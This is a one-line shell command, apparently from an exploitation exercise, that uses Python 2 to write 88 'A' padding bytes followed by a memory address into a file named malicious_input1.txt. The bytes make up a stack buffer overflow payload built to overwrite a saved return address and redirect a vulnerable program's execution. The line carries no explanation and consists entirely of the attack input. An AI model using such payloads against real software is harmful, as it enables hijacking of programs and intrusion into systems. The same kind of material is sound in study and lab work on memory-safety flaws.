python -c "print 'A'*88 + '\xa4\x49\x55\x55\x55\x55\x00'" > malicious_input1.txt
